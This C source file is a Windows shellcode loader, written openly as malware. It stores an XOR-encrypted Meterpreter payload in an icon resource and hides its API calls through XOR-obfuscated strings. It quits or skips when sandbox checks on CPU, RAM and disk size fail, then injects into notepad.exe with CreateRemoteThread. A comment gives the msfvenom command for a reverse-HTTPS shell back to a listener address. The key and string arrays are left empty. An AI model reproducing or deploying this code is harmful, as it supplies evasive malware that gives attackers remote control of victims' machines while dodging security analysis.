#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"
#include <tlhelp32.h>

//process injection to a specific process. function call obfuscation via xor encryption in order to dynamicaly resolve the functions to bypass static analysis.
//Also we store the payload to resource section in exe, the payload is stored in an icon encrypted via xor.
//First generate a payload and save it to a bin file msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.88.137 LPORT=443 -f csharp -b \x00 > payl.bin
//Then we encrypt with xor the payload and save it as an ico file
DWORD oldprotect = 0;
void* shell;
HGLOBAL resHandle = NULL;
HRSRC res;
unsigned char* payload;
unsigned int payload_len;

// keys to decrypt our encrypted xor strings
char key[] = "";
char key1[] = "";
char key2[] = "";
//char arrays of encrypted apis via xor
char sWrite[] = {  };
char sVallocEx[] = {  };
char sApomakrismenoThread[] = {  };
char sAnikseProcess[] = {  };
char sValloc[] = {  };
char sProtect[] = { };
char sMoveMem[] = { };

////here we create the function stabs based on msdn documentation.
//openprocess
HANDLE(WINAPI* PAnikseProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);
//createremotethread
HANDLE(WINAPI* PremoteThread)(HANDLE   hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
//writeprocessmemory
BOOL(WINAPI* PGrapseMnimi)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
//virtualAllocEx
LPVOID(WINAPI* PVallocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
//virtualalloc
LPVOID(WINAPI* pMalaccol)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
//virtualprotect
BOOL(WINAPI* pMalaccoProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
//rtlmovememory
VOID (WINAPI * pMoveMem)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source,SIZE_T Length);

//xor encryption
void GameKey(char* data, size_t data_len, char* key, size_t key_len)
{
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++)
	{
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
};

//this function finds the target process we specify in the main function
int FindTarget(const char* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}

//this function injects our payload to the remote process.
int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	//here we decrypt our encrypted xor functions.
	GameKey((char*)sWrite, strlen(sWrite), key2, sizeof key2);
	GameKey((char*)sApomakrismenoThread, strlen(sApomakrismenoThread), key1, sizeof key1);
	GameKey((char*)sVallocEx, strlen(sVallocEx), key1, sizeof key1);
	// we resolve our functions via getmodulehandle and getprocaddress
	FARPROC PVallocEx = GetProcAddress(GetModuleHandleA("kernel32.dll"), sVallocEx);
	pRemoteCode = PVallocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	// we write our payload to a remote process
	FARPROC PGrapseMnimi = GetProcAddress(GetModuleHandleA("kernel32.dll"), sWrite);
	PGrapseMnimi(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
	// we create a thread to the remote process
	FARPROC PremoteThread = GetProcAddress(GetModuleHandleA("kernel32.dll"), sApomakrismenoThread);
	hThread = PremoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		CloseHandle(hThread);
		return 0;
	}
	return -1;
}

//antiSandbox evasion
//here we check the specs of a sandbox that will analyse our malware we check the ram, disk space, and cpu process.
int checkCPU()
{

	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	if (numberOfProcessors < 2)
		 exit(0);
}

int checkHDD()
{
	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 200) return 0;

}
int checkRam()
{
	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048)
		exit(0);
}
//////

int pid = 0;
HANDLE hProc = NULL;

int main()
{
	//here we call our antisandbox functions
	checkCPU();
	checkRam();
	checkHDD();
	//we extract the payload from the disk 
	res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	payload = (char*)LockResource(resHandle);
	payload_len = SizeofResource(NULL, res);

	//we decrypt the virtualalloc function and resolve it.
	GameKey((char*)sValloc, strlen(sValloc), key1, sizeof key1);
	FARPROC pMalaccol = GetProcAddress(GetModuleHandleA("kernel32.dll"), sValloc);
	//we allocate memory that is readable and writeable
	shell = pMalaccol(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//here we copy our payload from the source to destination decrypt and resolve the rtlmovememory function
	GameKey((char*)sMoveMem, strlen(sMoveMem), key2, sizeof key2);
	FARPROC pMoveMem = GetProcAddress(GetModuleHandleA("kernel32.dll"), sMoveMem);
	pMoveMem(shell, payload, payload_len);
	//we decrypt the virtualprotect function and resolve it.
	GameKey((char*)sProtect, strlen(sProtect), key1, sizeof key1);
	FARPROC pMalaccoProtect = GetProcAddress(GetModuleHandleA("kernel32.dll"), sProtect);
	//here we decrypt our encrypted payload that is stored in the icon
	GameKey((char*)shell, payload_len, key, sizeof(key));
	//opsec way then we make our memory executable
	pMalaccoProtect(shell, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	//injection process starts here
	pid = FindTarget("notepad.exe");

	if (pid) {
		GameKey((char*)sAnikseProcess, strlen(sAnikseProcess), key2, sizeof key2);
		FARPROC PAnikseProcess = GetProcAddress(GetModuleHandleA("kernel32.dll"), sAnikseProcess);
		// try to open target process
		hProc = PAnikseProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)pid);

		if (hProc != NULL) {
			Inject(hProc, shell, payload_len);
			CloseHandle(hProc);
		}
	}
	return;
}